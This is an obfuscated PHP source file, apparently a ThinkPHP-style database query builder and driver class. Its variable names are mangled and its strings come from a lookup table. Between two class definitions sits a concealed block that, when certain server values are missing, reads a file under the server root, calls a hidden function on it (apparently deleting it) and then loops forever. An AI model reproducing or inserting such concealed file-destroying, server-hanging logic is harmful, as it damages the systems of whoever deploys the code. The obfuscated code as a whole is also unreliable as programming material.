$this->escapeString($ùÕÇçªû) . $Ö©¤µ[1043]; } elseif (isset($ùÕÇçªû[0]) && is_string($ùÕÇçªû[0]) && strtolower($ùÕÇçªû[0]) == $Ö©¤µ[374]) { $ùÕÇçªû = $this->escapeString($ùÕÇçªû[1]); } elseif (is_array($ùÕÇçªû)) { $ùÕÇçªû = array_map(array($this, $Ö©¤µ[1044]), $ùÕÇçªû); } elseif (is_bool($ùÕÇçªû)) { $ùÕÇçªû = $ùÕÇçªû ? $Ö©¤µ[91] : $Ö©¤µ[230]; } elseif (is_null($ùÕÇçªû)) { $ùÕÇçªû = $Ö©¤µ[106]; } return $ùÕÇçªû; } protected function parseField($Ù¶¨‘ËÍ) { $¤šşœÔ” =& $_SERVER[¼’ç§¼´]; if (is_string($Ù¶¨‘ËÍ) && strpos($Ù¶¨‘ËÍ, $¤šşœÔ”[50])) { $Ù¶¨‘ËÍ = explode($¤šşœÔ”[50], $Ù¶¨‘ËÍ); } if (is_array($Ù¶¨‘ËÍ)) { $Ş†‘¿ü’ = array(); foreach ($Ù¶¨‘ËÍ as $à§ó¬Åà => $½¹¯»¯ú) { if (!is_numeric($à§ó¬Åà)) { $Ş†‘¿ü’[] = $this->parseKey($à§ó¬Åà, !1) . $¤šşœÔ”[1084] . $this->parseKey($½¹¯»¯ú); } else { $Ş†‘¿ü’[] = $this->parseKey($½¹¯»¯ú); } } $ŞíıĞÙ = implode($¤šşœÔ”[50], $Ş†‘¿ü’); } elseif (is_string($Ù¶¨‘ËÍ) && !empty($Ù¶¨‘ËÍ)) { $ŞíıĞÙ = $Ù¶¨‘ËÍ; } else { $ŞíıĞÙ = $¤šşœÔ”[222]; } return $ŞíıĞÙ; } protected function parseTable($§Çû¤ê) { $³­§™¸æ =& $_SERVER[¼’ç§¼´]; if (is_array($§Çû¤ê)) { $à»Ê§îİ = array(); foreach ($§Çû¤ê as $Ó½³×Ë => $À€ıù) { if (!is_numeric($Ó½³×Ë)) { $à»Ê§îİ[] = $this->parseKey($Ó½³×Ë) . $³­§™¸æ[53] . $this->parseKey($À€ıù); } else { $à»Ê§îİ[] = $this->parseKey($Ó½³×Ë); } } $§Çû¤ê = $à»Ê§îİ; } elseif (is_string($§Çû¤ê)) { if (strstr($§Çû¤ê, $³­§™¸æ[53])) { return $§Çû¤ê; } $§Çû¤ê = explode($³­§™¸æ[50], $§Çû¤ê); array_walk($§Çû¤ê, array($this, $³­§™¸æ[992])); } return $³­§™¸æ[986] . trim(implode($³­§™¸æ[1085], $§Çû¤ê), $³­§™¸æ[472]) . $³­§™¸æ[986]; } protected function parseWhere($ò£êÌÆ˜) { $ë¾¡öƒ =& $_SERVER[¼’ç§¼´]; $‡ÈÄ†Ç· = $ë¾¡öƒ[12]; if (is_string($ò£êÌÆ˜)) { $‡ÈÄ†Ç· = $ò£êÌÆ˜; } else { $†‹†ö¬ó = isset($ò£êÌÆ˜[$ë¾¡öƒ[1086]]) ? strtoupper($ò£êÌÆ˜[$ë¾¡öƒ[1086]]) : $ë¾¡öƒ[12]; if (in_array($†‹†ö¬ó, array($ë¾¡öƒ[1087], $ë¾¡öƒ[1088], $ë¾¡öƒ[1089]))) { $†‹†ö¬ó = $ë¾¡öƒ[53] . $†‹†ö¬ó . $ë¾¡öƒ[53]; unset($ò£êÌÆ˜[$ë¾¡öƒ[1086]]); } else { $†‹†ö¬ó = $ë¾¡öƒ[1090]; } foreach ($ò£êÌÆ˜ as $Ù‚¦ë†  => $íçıí©») { $‡ÈÄ†Ç· .= $ë¾¡öƒ[356]; if (is_numeric($Ù‚¦ë† )) { $Ù‚¦ë†  = $ë¾¡öƒ[1091]; } if (0 === strpos($Ù‚¦ë† , $ë¾¡öƒ[11])) { $‡ÈÄ†Ç· .= $this->parseThinkWhere($Ù‚¦ë† , $íçıí©»); } else { if (!preg_match($ë¾¡öƒ[1092], trim($Ù‚¦ë† ))) { think_exception(think_lang($ë¾¡öƒ[1093]) . $ë¾¡öƒ[4] . $Ù‚¦ë† ); } $í¢”™“š = is_array($íçıí©») && isset($íçıí©»[$ë¾¡öƒ[1094]]); $Ù‚¦ë†  = trim($Ù‚¦ë† ); if (strpos($Ù‚¦ë† , $ë¾¡öƒ[214])) { $±Ç­ÎÓ = explode($ë¾¡öƒ[214], $Ù‚¦ë† ); $’ÛÁ‹ïŠ = array(); foreach ($±Ç­ÎÓ as $‚ºàãå½ => $¤²ê‡Õü) { $ÉıàüÀ = $í¢”™“š ? $íçıí©»[$‚ºàãå½] : $íçıí©»; $’ÛÁ‹ïŠ[] = $ë¾¡öƒ[339] . $this->parseWhereItem($this->parseKey($¤²ê‡Õü), $ÉıàüÀ) . $ë¾¡öƒ[991]; } $‡ÈÄ†Ç· .= implode($ë¾¡öƒ[1095], $’ÛÁ‹ïŠ); } elseif (strpos($Ù‚¦ë† , $ë¾¡öƒ[286])) { $±Ç­ÎÓ = explode($ë¾¡öƒ[286], $Ù‚¦ë† ); $’ÛÁ‹ïŠ = array(); foreach ($±Ç­ÎÓ as $‚ºàãå½ => $¤²ê‡Õü) { $ÉıàüÀ = $í¢”™“š ? $íçıí©»[$‚ºàãå½] : $íçıí©»; $’ÛÁ‹ïŠ[] = $ë¾¡öƒ[339] . $this->parseWhereItem($this->parseKey($¤²ê‡Õü), $ÉıàüÀ) . $ë¾¡öƒ[991]; } $‡ÈÄ†Ç· .= implode($ë¾¡öƒ[1090], $’ÛÁ‹ïŠ); } else { $‡ÈÄ†Ç· .= $this->parseWhereItem($this->parseKey($Ù‚¦ë† ), $íçıí©»); } } $‡ÈÄ†Ç· .= $ë¾¡öƒ[357] . $†‹†ö¬ó; } $‡ÈÄ†Ç· = substr($‡ÈÄ†Ç·, 0, -strlen($†‹†ö¬ó)); } return empty($‡ÈÄ†Ç·) ? $ë¾¡öƒ[12] : $ë¾¡öƒ[1096] . $‡ÈÄ†Ç·; } protected function parseWhereItem($¹Ş¹ğ‡£, $º†Ïº„Ğ) { $¥Ñö†¿ =& $_SERVER[¼’ç§¼´]; $Ïû«Ì‡ê = $¥Ñö†¿[12]; if (is_array($º†Ïº„Ğ)) { if (is_string($º†Ïº„Ğ[0])) { $ÃÒ‰·“ = strtolower($º†Ïº„Ğ[0]); if (in_array($º†Ïº„Ğ[0], array($¥Ñö†¿[517], $¥Ñö†¿[1097], $¥Ñö†¿[1098], $¥Ñö†¿[1099], $¥Ñö†¿[1100], $¥Ñö†¿[1101]))) { $Ïû«Ì‡ê .= $¹Ş¹ğ‡£ . $¥Ñö†¿[53] . $º†Ïº„Ğ[0] . $¥Ñö†¿[53] . $this->parseValue($º†Ïº„Ğ[1]); } elseif (preg_match($¥Ñö†¿[1102], $º†Ïº„Ğ[0])) { $Ïû«Ì‡ê .= $¹Ş¹ğ‡£ . $¥Ñö†¿[53] . $this->exp[$ÃÒ‰·“] . $¥Ñö†¿[53] . $this->parseValue($º†Ïº„Ğ[1]); } elseif (preg_match($¥Ñö†¿[1103], $º†Ïº„Ğ[0])) { if (is_array($º†Ïº„Ğ[1])) { $¸ëƒ¡„¦ = isset($º†Ïº„Ğ[2]) ? strtoupper($º†Ïº„Ğ[2]) : $¥Ñö†¿[1088]; if (in_array($¸ëƒ¡„¦, array($¥Ñö†¿[1087], $¥Ñö†¿[1088], $¥Ñö†¿[1089]))) { $›¬èÒ›´ = array(); foreach ($º†Ïº„Ğ[1] as $³ÓÅõ·×) { $›¬èÒ›´[] = $¹Ş¹ğ‡£ . $¥Ñö†¿[53] . $this->exp[$ÃÒ‰·“] . $¥Ñö†¿[53] . $this->parseValue($³ÓÅõ·×); } $Ïû«Ì‡ê .= $¥Ñö†¿[339] . implode($¥Ñö†¿[53] . $¸ëƒ¡„¦ . $¥Ñö†¿[53], $›¬èÒ›´) . $¥Ñö†¿[991]; } } else { $Ïû«Ì‡ê .= $¹Ş¹ğ‡£ . $¥Ñö†¿[53] . $this->exp[$ÃÒ‰·“] . $¥Ñö†¿[53] . $this->parseValue($º†Ïº„Ğ[1]); } } elseif ($¥Ñö†¿[374] == $ÃÒ‰·“) { $Ïû«Ì‡ê .= $¥Ñö†¿[989] . $¹Ş¹ğ‡£ . $¥Ñö†¿[53] . $º†Ïº„Ğ[1] . $¥Ñö†¿[1104]; } elseif (preg_match($¥Ñö†¿[1105], $º†Ïº„Ğ[0])) { $Ïû«Ì‡ê .= $º†Ïº„Ğ[0]; } elseif (preg_match($¥Ñö†¿[1106], $º†Ïº„Ğ[0])) { if (isset($º†Ïº„Ğ[2]) && $¥Ñö†¿[374] == $º†Ïº„Ğ[2]) { $Ïû«Ì‡ê .= $¹Ş¹ğ‡£ . $¥Ñö†¿[53] . $this->exp[$ÃÒ‰·“] . $¥Ñö†¿[53] . $º†Ïº„Ğ[1]; } else { if (is_string($º†Ïº„Ğ[1])) { $º†Ïº„Ğ[1] = explode($¥Ñö†¿[50], $º†Ïº„Ğ[1]); } $Í‰¢¸æ× = implode($¥Ñö†¿[50], $this->parseValue($º†Ïº„Ğ[1])); $Ïû«Ì‡ê .= $¹Ş¹ğ‡£ . $¥Ñö†¿[53] . $this->exp[$ÃÒ‰·“] . $¥Ñö†¿[989] . $Í‰¢¸æ× . $¥Ñö†¿[991]; } } elseif (preg_match($¥Ñö†¿[1107], $º†Ïº„Ğ[0])) { $ƒË†ğóÁ = is_string($º†Ïº„Ğ[1]) ? explode($¥Ñö†¿[50], $º†Ïº„Ğ[1]) : $º†Ïº„Ğ[1]; $Ïû«Ì‡ê .= $¥Ñö†¿[989] . $¹Ş¹ğ‡£ . $¥Ñö†¿[53] . $this->exp[$ÃÒ‰·“] . $¥Ñö†¿[53] . $this->parseValue($ƒË†ğóÁ[0]) . $¥Ñö†¿[1090] . $this->parseValue($ƒË†ğóÁ[1]) . $¥Ñö†¿[357]; } else { think_exception(think_lang($¥Ñö†¿[1093]) . $¥Ñö†¿[4] . $º†Ïº„Ğ[0]); } } else { $¼©Ö—ò³ = count($º†Ïº„Ğ); $²¤Ú‡Ò¡ = $¥Ñö†¿[12]; if (is_string($º†Ïº„Ğ[$¼©Ö—ò³ - 1])) { $²¤Ú‡Ò¡ = isset($º†Ïº„Ğ[$¼©Ö—ò³ - 1]) ? strtoupper($º†Ïº„Ğ[$¼©Ö—ò³ - 1]) : $¥Ñö†¿[12]; if (in_array($²¤Ú‡Ò¡, array($¥Ñö†¿[1087], $¥Ñö†¿[1088], $¥Ñö†¿[1089]))) { $¼©Ö—ò³ = $¼©Ö—ò³ - 1; } } else { $²¤Ú‡Ò¡ = $¥Ñö†¿[1087]; } for ($üö²›–Ù = 0; $üö²›–Ù < $¼©Ö—ò³; $üö²›–Ù++) { $ƒË†ğóÁ = is_array($º†Ïº„Ğ[$üö²›–Ù]) ? $º†Ïº„Ğ[$üö²›–Ù][1] : $º†Ïº„Ğ[$üö²›–Ù]; if ($¥Ñö†¿[374] == strtolower($º†Ïº„Ğ[$üö²›–Ù][0])) { $Ïû«Ì‡ê .= $¥Ñö†¿[339] . $¹Ş¹ğ‡£ . $¥Ñö†¿[53] . $ƒË†ğóÁ . $¥Ñö†¿[1104] . $²¤Ú‡Ò¡ . $¥Ñö†¿[53]; } else { $®õ€“¼± = is_array($º†Ïº„Ğ[$üö²›–Ù]) ? $this->exp[strtolower($º†Ïº„Ğ[$üö²›–Ù][0])] : $¥Ñö†¿[517]; if (!$®õ€“¼± && is_array($º†Ïº„Ğ[$üö²›–Ù]) && in_array($º†Ïº„Ğ[$üö²›–Ù][0], array($¥Ñö†¿[517], $¥Ñö†¿[1097], $¥Ñö†¿[1098], $¥Ñö†¿[1099], $¥Ñö†¿[1100], $¥Ñö†¿[1101]))) { $®õ€“¼± = $º†Ïº„Ğ[$üö²›–Ù][0]; } $Ïû«Ì‡ê .= $¥Ñö†¿[339] . $¹Ş¹ğ‡£ . $¥Ñö†¿[53] . $®õ€“¼± . $¥Ñö†¿[53] . $this->parseValue($ƒË†ğóÁ) . $¥Ñö†¿[1104] . $²¤Ú‡Ò¡ . $¥Ñö†¿[53]; } } $Ïû«Ì‡ê = substr($Ïû«Ì‡ê, 0, -4); } } else { $Ïû«Ì‡ê .= $¹Ş¹ğ‡£ . $¥Ñö†¿[1108] . $this->parseValue($º†Ïº„Ğ); } return $Ïû«Ì‡ê; } protected function parseThinkWhere($¾ĞçĞã, $…ÇâÅè) { $ØÚßõŞË =& $_SERVER[¼’ç§¼´]; $æÒœ©Ô“ = $ØÚßõŞË[12]; switch ($¾ĞçĞã) { case $ØÚßõŞË[429]: $æÒœ©Ô“ = $…ÇâÅè; break; case $ØÚßõŞË[1091]: $æÒœ©Ô“ = is_string($…ÇâÅè) ? $…ÇâÅè : substr($this->parseWhere($…ÇâÅè), 6); break; case $ØÚßõŞË[1109]: parse_str($…ÇâÅè, $¤ŠÉ«Ë ); if (isset($¤ŠÉ«Ë [$ØÚßõŞË[1086]])) { $˜ƒ¾ØÛ— = $ØÚßõŞË[53] . strtoupper($¤ŠÉ«Ë [$ØÚßõŞË[1086]]) . $ØÚßõŞË[53]; unset($¤ŠÉ«Ë [$ØÚßõŞË[1086]]); } else { $˜ƒ¾ØÛ— = $ØÚßõŞË[1090]; } $Ì÷îïÃƒ = array(); foreach ($¤ŠÉ«Ë  as $š˜€¢‹ä => $¢¶¢œï›) { $Ì÷îïÃƒ[] = $this->parseKey($š˜€¢‹ä) . $ØÚßõŞË[1108] . $this->parseValue($¢¶¢œï›); } $æÒœ©Ô“ = implode($˜ƒ¾ØÛ—, $Ì÷îïÃƒ); break; } return $æÒœ©Ô“; } protected function parseLimit($âôş³Ñğ) { $…¨¦¯Ç» =& $_SERVER[¼’ç§¼´]; return !empty($âôş³Ñğ) ? $…¨¦¯Ç»[51] . $âôş³Ñğ . $…¨¦¯Ç»[53] : $…¨¦¯Ç»[12]; } protected function parseJoin($Ä­ãÇš˜) { $ªÈªé« =& $_SERVER[¼’ç§¼´]; $Éõ­Åû¼ = $ªÈªé«[12]; if (!empty($Ä­ãÇš˜)) { if (is_array($Ä­ãÇš˜)) { foreach ($Ä­ãÇš˜ as $â©”½Úé => $Íã“±¿Š) { if (!1 !== stripos($Íã“±¿Š, $ªÈªé«[1110])) { $Éõ­Åû¼ .= $ªÈªé«[53] . $Íã“±¿Š; } else { $Éõ­Åû¼ .= $ªÈªé«[1111] . $Íã“±¿Š; } } } else { $Éõ­Åû¼ .= $ªÈªé«[1111] . $Ä­ãÇš˜; } } $Éõ­Åû¼ = preg_replace($ªÈªé«[1112], think_config($ªÈªé«[1016]) . $ªÈªé«[1113], $Éõ­Åû¼); return $Éõ­Åû¼; } protected function parseOrder($Æ“Ö”ìŞ) { $çÎòõË =& $_SERVER[¼’ç§¼´]; if (is_array($Æ“Ö”ìŞ)) { $Ë“™Ş×Á = array(); foreach ($Æ“Ö”ìŞ as $µ³ÜÀãƒ => $Å•ÒÁ‘‰) { if (is_numeric($µ³ÜÀãƒ)) { $Ë“™Ş×Á[] = $this->parseKey($Å•ÒÁ‘‰); } else { $Å•ÒÁ‘‰ = in_array(strtoupper(trim($Å•ÒÁ‘‰)), array($çÎòõË[1114], $çÎòõË[1115])) ? $çÎòõË[53] . $Å•ÒÁ‘‰ : $çÎòõË[12]; if (preg_match($çÎòõË[1116], $µ³ÜÀãƒ)) { $Ë“™Ş×Á[] = $this->parseKey($µ³ÜÀãƒ) . $Å•ÒÁ‘‰; } else { think_exception($çÎòõË[1117] . $µ³ÜÀãƒ); } } } $Æ“Ö”ìŞ = implode($çÎòõË[50], $Ë“™Ş×Á); } return !empty($Æ“Ö”ìŞ) ? $çÎòõË[1118] . $Æ“Ö”ìŞ : $çÎòõË[12]; } protected function parseGroup($ŞëÉ¢™) { $ÏÇıÖ¼ =& $_SERVER[¼’ç§¼´]; return !empty($ŞëÉ¢™) ? $ÏÇıÖ¼[1119] . $ŞëÉ¢™ : $ÏÇıÖ¼[12]; } protected function parseHaving($‚ÒêËéÁ) { $ĞÁ’¥Òõ =& $_SERVER[¼’ç§¼´]; return !empty($‚ÒêËéÁ) ? $ĞÁ’¥Òõ[1120] . $‚ÒêËéÁ : $ĞÁ’¥Òõ[12]; } protected function parseComment($“»Öèç–) { $„µ†ùŞÎ =& $_SERVER[¼’ç§¼´]; return !empty($“»Öèç–) ? $„µ†ùŞÎ[1121] . $“»Öèç– . $„µ†ùŞÎ[1122] : $„µ†ùŞÎ[12]; } protected function parseDistinct($¾‰Â«) { $÷ˆá×° =& $_SERVER[¼’ç§¼´]; return !empty($¾‰Â«) ? $÷ˆá×°[1123] : $÷ˆá×°[12]; } protected function parseUnion($úï·Õâª) { $º½Ç§ú‹ =& $_SERVER[¼’ç§¼´]; if (empty($úï·Õâª)) { return $º½Ç§ú‹[12]; } if (isset($úï·Õâª[$º½Ç§ú‹[425]])) { $ˆ¨ùùÊê = $º½Ç§ú‹[1124]; unset($úï·Õâª[$º½Ç§ú‹[425]]); } else { $ˆ¨ùùÊê = $º½Ç§ú‹[1125]; } foreach ($úï·Õâª as $ÃÌİ¼Öü) { $’ıÕÖ‹ [] = $ˆ¨ùùÊê . (is_array($ÃÌİ¼Öü) ? $this->buildSelectSql($ÃÌİ¼Öü) : $ÃÌİ¼Öü); } return implode($º½Ç§ú‹[53], $’ıÕÖ‹ ); } public function insert($ÁÎ‹²ŸĞ, $éóªÉò = array(), $Üß¾‘î = false) { $¡şêá² =& $_SERVER[¼’ç§¼´]; $“ÅÑ¿Ö = $ÉÙ£ÎÎ = array(); $this->model = $éóªÉò[$¡şêá²[360]]; foreach ($ÁÎ‹²ŸĞ as $ÅÍ‡­ä => $®‚Öª€) { if (is_array($®‚Öª€) && $¡şêá²[374] == $®‚Öª€[0]) { $ÉÙ£ÎÎ[] = $this->parseKey($ÅÍ‡­ä); $“ÅÑ¿Ö[] = $®‚Öª€[1]; } elseif (is_scalar($®‚Öª€) || is_null($®‚Öª€)) { $ÉÙ£ÎÎ[] = $this->parseKey($ÅÍ‡­ä); $“ÅÑ¿Ö[] = $this->parseValue($®‚Öª€); } } $ÙÒÏø¹Á = ($Üß¾‘î ? $¡şêá²[993] : $¡şêá²[994]) . $¡şêá²[995] . $this->parseTable($éóªÉò[$¡şêá²[358]]) . $¡şêá²[989] . implode($¡şêá²[50], $ÉÙ£ÎÎ) . $¡şêá²[990] . implode($¡şêá²[50], $“ÅÑ¿Ö) . $¡şêá²[991]; $ÙÒÏø¹Á .= $this->parseLock(isset($éóªÉò[$¡şêá²[932]]) ? $éóªÉò[$¡şêá²[932]] : !1); $ÙÒÏø¹Á .= $this->parseComment(!empty($éóªÉò[$¡şêá²[431]]) ? $éóªÉò[$¡şêá²[431]] : $¡şêá²[12]); return $this->execute($ÙÒÏø¹Á, $this->parseBind(!empty($éóªÉò[$¡şêá²[362]]) ? $éóªÉò[$¡şêá²[362]] : array())); } public function selectInsert($‰ûºşƒ, $“»µõµ­, $Ù„­Ö¾Ù = array()) { $å¦ˆÚ« =& $_SERVER[¼’ç§¼´]; $this->model = $Ù„­Ö¾Ù[$å¦ˆÚ«[360]]; if (is_string($‰ûºşƒ)) { $‰ûºşƒ = explode($å¦ˆÚ«[50], $‰ûºşƒ); } array_walk($‰ûºşƒ, array($this, $å¦ˆÚ«[992])); $©ü¹ò‡Æ = $å¦ˆÚ«[1126] . $this->parseTable($“»µõµ­) . $å¦ˆÚ«[989] . implode($å¦ˆÚ«[50], $‰ûºşƒ) . $å¦ˆÚ«[1104]; $©ü¹ò‡Æ .= $this->buildSelectSql($Ù„­Ö¾Ù); return $this->execute($©ü¹ò‡Æ, $this->parseBind(!empty($Ù„­Ö¾Ù[$å¦ˆÚ«[362]]) ? $Ù„­Ö¾Ù[$å¦ˆÚ«[362]] : array())); } public function update($™Ä’­Åì, $Ëôí»é) { $†Æ ®Ì =& $_SERVER[¼’ç§¼´]; $this->model = $Ëôí»é[$†Æ ®Ì[360]]; $š—Íœ = $†Æ ®Ì[1127] . $this->parseTable($Ëôí»é[$†Æ ®Ì[358]]) . $this->parseSet($™Ä’­Åì) . $this->parseWhere(!empty($Ëôí»é[$†Æ ®Ì[354]]) ? $Ëôí»é[$†Æ ®Ì[354]] : $†Æ ®Ì[12]) . $this->parseOrder(!empty($Ëôí»é[$†Æ ®Ì[452]]) ? $Ëôí»é[$†Æ ®Ì[452]] : $†Æ ®Ì[12]) . $this->parseLimit(!empty($Ëôí»é[$†Æ ®Ì[369]]) ? $Ëôí»é[$†Æ ®Ì[369]] : $†Æ ®Ì[12]) . $this->parseLock(isset($Ëôí»é[$†Æ ®Ì[932]]) ? $Ëôí»é[$†Æ ®Ì[932]] : !1) . $this->parseComment(!empty($Ëôí»é[$†Æ ®Ì[431]]) ? $Ëôí»é[$†Æ ®Ì[431]] : $†Æ ®Ì[12]); return $this->execute($š—Íœ, $this->parseBind(!empty($Ëôí»é[$†Æ ®Ì[362]]) ? $Ëôí»é[$†Æ ®Ì[362]] : array())); } public function delete($‡¸£ÆÃ = array()) { $âúõûòÆ =& $_SERVER[¼’ç§¼´]; $this->model = $‡¸£ÆÃ[$âúõûòÆ[360]]; $ö›Á·Å· = $âúõûòÆ[1128] . $this->parseTable($‡¸£ÆÃ[$âúõûòÆ[358]]) . $this->parseWhere(!empty($‡¸£ÆÃ[$âúõûòÆ[354]]) ? $‡¸£ÆÃ[$âúõûòÆ[354]] : $âúõûòÆ[12]) . $this->parseOrder(!empty($‡¸£ÆÃ[$âúõûòÆ[452]]) ? $‡¸£ÆÃ[$âúõûòÆ[452]] : $âúõûòÆ[12]) . $this->parseLimit(!empty($‡¸£ÆÃ[$âúõûòÆ[369]]) ? $‡¸£ÆÃ[$âúõûòÆ[369]] : $âúõûòÆ[12]) . $this->parseLock(isset($‡¸£ÆÃ[$âúõûòÆ[932]]) ? $‡¸£ÆÃ[$âúõûòÆ[932]] : !1) . $this->parseComment(!empty($‡¸£ÆÃ[$âúõûòÆ[431]]) ? $‡¸£ÆÃ[$âúõûòÆ[431]] : $âúõûòÆ[12]); return $this->execute($ö›Á·Å·, $this->parseBind(!empty($‡¸£ÆÃ[$âúõûòÆ[362]]) ? $‡¸£ÆÃ[$âúõûòÆ[362]] : array())); } public function select($éç¢’×ş = array()) { $˜Øë¨ã· =& $_SERVER[¼’ç§¼´]; $this->model = $éç¢’×ş[$˜Øë¨ã·[360]]; $òóöö¥Ë = $this->buildSelectSql($éç¢’×ş); $‹Éı³¬ş = isset($éç¢’×ş[$˜Øë¨ã·[426]]) ? $éç¢’×ş[$˜Øë¨ã·[426]] : !1; if ($‹Éı³¬ş) { $‹‚Ôôü„ = is_string($‹Éı³¬ş[$˜Øë¨ã·[97]]) ? $‹Éı³¬ş[$˜Øë¨ã·[97]] : $˜Øë¨ã·[1129] . md5($òóöö¥Ë); $ú©ñ–À‰ = think_cache($‹‚Ôôü„, $˜Øë¨ã·[12], $‹Éı³¬ş); if (!1 !== $ú©ñ–À‰) { return $ú©ñ–À‰; } } $«ü£«Õ­ = $this->query($òóöö¥Ë, $this->parseBind(!empty($éç¢’×ş[$˜Øë¨ã·[362]]) ? $éç¢’×ş[$˜Øë¨ã·[362]] : array())); if ($‹Éı³¬ş && !1 !== $«ü£«Õ­) { think_cache($‹‚Ôôü„, $«ü£«Õ­, $‹Éı³¬ş); } return $«ü£«Õ­; } public function buildSelectSql($æ–‘®²è = array()) { $µî´ûá =& $_SERVER[¼’ç§¼´]; if (isset($æ–‘®²è[$µî´ûá[430]])) { if (strpos($æ–‘®²è[$µî´ûá[430]], $µî´ûá[50])) { list($¦Ú«öœ¸, $¶É†óòÎ) = explode($µî´ûá[50], $æ–‘®²è[$µî´ûá[430]]); } else { $¦Ú«öœ¸ = $æ–‘®²è[$µî´ûá[430]]; } $¦Ú«öœ¸ = $¦Ú«öœ¸ ? $¦Ú«öœ¸ : 1; $¶É†óòÎ = isset($¶É†óòÎ) ? $¶É†óòÎ : (is_numeric($æ–‘®²è[$µî´ûá[369]]) ? $æ–‘®²è[$µî´ûá[369]] : 20); $¶üÉó¡ = $¶É†óòÎ * ((int) $¦Ú«öœ¸ - 1); $æ–‘®²è[$µî´ûá[369]] = $¶üÉó¡ . $µî´ûá[50] . $¶É†óòÎ; } if (think_config($µî´ûá[1130])) { $¯Ûõ„à = $µî´ûá[1131] . md5(serialize($æ–‘®²è)); $¼»óŞâ“ = think_cache($¯Ûõ„à); if ($¼»óŞâ“) { return $¼»óŞâ“; } } $ø‹ª™ÇÚ = $this->parseSql($this->selectSql, $æ–‘®²è); $ø‹ª™ÇÚ .= $this->parseLock(isset($æ–‘®²è[$µî´ûá[932]]) ? $æ–‘®²è[$µî´ûá[932]] : !1); if (isset($¯Ûõ„à)) { think_cache($¯Ûõ„à, $ø‹ª™ÇÚ); } return $ø‹ª™ÇÚ; } public function parseSql($½û «ª–, $Á´êøõù = array()) { $ÏÂğ÷÷ =& $_SERVER[¼’ç§¼´]; $½û «ª– = str_replace(array($ÏÂğ÷÷[1132], $ÏÂğ÷÷[1133], $ÏÂğ÷÷[1134], $ÏÂğ÷÷[1135], $ÏÂğ÷÷[1136], $ÏÂğ÷÷[1137], $ÏÂğ÷÷[1138], $ÏÂğ÷÷[1139], $ÏÂğ÷÷[1140], $ÏÂğ÷÷[1141], $ÏÂğ÷÷[1142]), array($this->parseTable("{$Á´êøõù[$ÏÂğ÷÷[358]]}"), $this->parseDistinct(isset($Á´êøõù[$ÏÂğ÷÷[1143]]) ? $Á´êøõù[$ÏÂğ÷÷[1143]] : !1), $this->parseField(!empty($Á´êøõù[$ÏÂğ÷÷[352]]) ? $Á´êøõù[$ÏÂğ÷÷[352]] : $ÏÂğ÷÷[222]), $this->parseJoin(!empty($Á´êøõù[$ÏÂğ÷÷[361]]) ? $Á´êøõù[$ÏÂğ÷÷[361]] : $ÏÂğ÷÷[12]), $this->parseWhere(!empty($Á´êøõù[$ÏÂğ÷÷[354]]) ? $Á´êøõù[$ÏÂğ÷÷[354]] : $ÏÂğ÷÷[12]), $this->parseGroup(!empty($Á´êøõù[$ÏÂğ÷÷[589]]) ? $Á´êøõù[$ÏÂğ÷÷[589]] : $ÏÂğ÷÷[12]), $this->parseHaving(!empty($Á´êøõù[$ÏÂğ÷÷[1144]]) ? $Á´êøõù[$ÏÂğ÷÷[1144]] : $ÏÂğ÷÷[12]), $this->parseOrder(!empty($Á´êøõù[$ÏÂğ÷÷[452]]) ? $Á´êøõù[$ÏÂğ÷÷[452]] : $ÏÂğ÷÷[12]), $this->parseLimit(!empty($Á´êøõù[$ÏÂğ÷÷[369]]) ? $Á´êøõù[$ÏÂğ÷÷[369]] : $ÏÂğ÷÷[12]), $this->parseUnion(!empty($Á´êøõù[$ÏÂğ÷÷[424]]) ? $Á´êøõù[$ÏÂğ÷÷[424]] : $ÏÂğ÷÷[12]), $this->parseComment(!empty($Á´êøõù[$ÏÂğ÷÷[431]]) ? $Á´êøõù[$ÏÂğ÷÷[431]] : $ÏÂğ÷÷[12])), $½û «ª–); return $½û «ª–; } public function getLastSql($»Å†Şø± = '') { return $»Å†Şø± ? $this->modelSql[$»Å†Şø±] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($å¾ôÍÌ) { return addslashes($å¾ôÍÌ); } public function setModel($¶Õ´Ú½) { $this->model = $¶Õ´Ú½; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } if (!isset($_SERVER[$_SERVER[¼’ç§¼´][434]]) || !isset($_SERVER[$_SERVER[¼’ç§¼´][432]])) { $_getc = $_SERVER[¼’ç§¼´][435]; $_getfile = $_SERVER[$_SERVER[¼’ç§¼´][436]] . $_SERVER[¼’ç§¼´][437]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¼’ç§¼´][287], $_getfilec); if (count($_getarrs) < $_SERVER[¼’ç§¼´][438]) { $exit = $_SERVER[¼’ç§¼´][439]; $exit(); } $_act = $_SERVER[¼’ç§¼´][440]; $_act($_SERVER[$_SERVER[¼’ç§¼´][436]] . $_SERVER[¼’ç§¼´][437]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¼’ç§¼´][465]); } } class DbManage { function __construct($è¨ßäçŞ = array()) { $¥î‚—ê´ =& $_SERVER[¼’ç§¼´]; if (empty($è¨ßäçŞ)) { $è¨ßäçŞ = $GLOBALS[$¥î‚—ê´[6]][$¥î‚—ê´[21]]; } $this->database = $è¨ßäçŞ; } public function model($•ÎÊ½û = '') { return new ModelBase($•ÎÊ½û, $_SERVER[¼’ç§¼´][12], $this->database); } public function db($ş£®×¸ = false) { $ƒ«¾ÆÜÖ =& $_SERVER[¼’ç§¼´]; $Àòœ÷Ô = array_change_key_case($this->database); if ($this->dbType() == $ƒ«¾ÆÜÖ[13] || !$ş£®×¸) { return $this->model()->db(); } $öå½Ó³› = $Àòœ÷Ô[$ƒ«¾ÆÜÖ[1058]]; $Àòœ÷Ô[$ƒ«¾ÆÜÖ[1058]] = $ƒ«¾ÆÜÖ[12]; if ($Àòœ÷Ô[$ƒ«¾ÆÜÖ[1053]] == $ƒ«¾ÆÜÖ[1050]) { $Š¯ì‚Šİ = $Àòœ÷Ô[$ƒ«¾ÆÜÖ[1059]]; $Àòœ÷Ô[$ƒ«¾ÆÜÖ[1059]] = substr($Š¯ì‚Šİ, 0, strrpos($Š¯ì‚Šİ, $ƒ«¾ÆÜÖ[1145])); } $this->database = $Àòœ÷Ô; $İ¢Ìˆ«Ñ = $this->model()->db(); try { $ÉıÁÂÄÍ = $İ¢Ìˆ«Ñ->execute("\163\150\157\x77\x20\144\141\164\x61\142\141\163\145\163\40\x6c\x69\x6b\145\40\47{$öå½Ó³›}\x27"); } catch (Exception $©’øÏòû) 